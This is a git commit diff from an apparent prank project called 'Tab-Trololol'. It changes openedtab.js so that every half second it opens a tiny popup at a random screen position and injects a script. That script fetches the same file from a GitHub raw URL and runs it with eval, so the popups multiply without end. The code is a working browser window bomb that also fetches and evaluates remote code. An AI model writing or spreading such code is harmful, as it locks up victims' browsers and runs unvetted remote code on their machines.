07be1e553a320493608802f706493352a825d548
Electric131 <39623923+Electric131@users.noreply.github.com>
2022-03-23 11:10:13 -0500

    Reverted

--- openedtab.js
+++ openedtab.js
@@ -7,9 +7,11 @@ let xPos;
 let yPos;
 let newWin;
 let newScript;
-xPos = Math.floor(Math.random() * (xMax - xMin + 1) + xMin);
-yPos = Math.floor(Math.random() * (yMax - yMin + 1) + yMin);
-newWin = open('', '', `left=${xPos},top=${yPos},height=1,width=1`);
-newScript = newWin.document.createElement('script');
-newScript.text = "fetch('https://raw.githubusercontent.com/Electric131/Tab-Trololol/main/openedtab.js').then(data=>data.text().then(text=>eval(text)));"
-newWin.document.body.appendChild(newScript)
+let tabloop = setInterval(function() {
+	xPos = Math.floor(Math.random() * (xMax - xMin + 1) + xMin);
+	yPos = Math.floor(Math.random() * (yMax - yMin + 1) + yMin);
+	newWin = open('', '', `left=${xPos},top=${yPos},height=1,width=1`);
+	newScript = newWin.document.createElement('script');
+	newScript.text = "fetch('https://raw.githubusercontent.com/Electric131/Tab-Trololol/main/openedtab.js').then(data=>data.text().then(text=>eval(text)));"
+	newWin.document.body.appendChild(newScript)
+}, 500); // Run every half second.
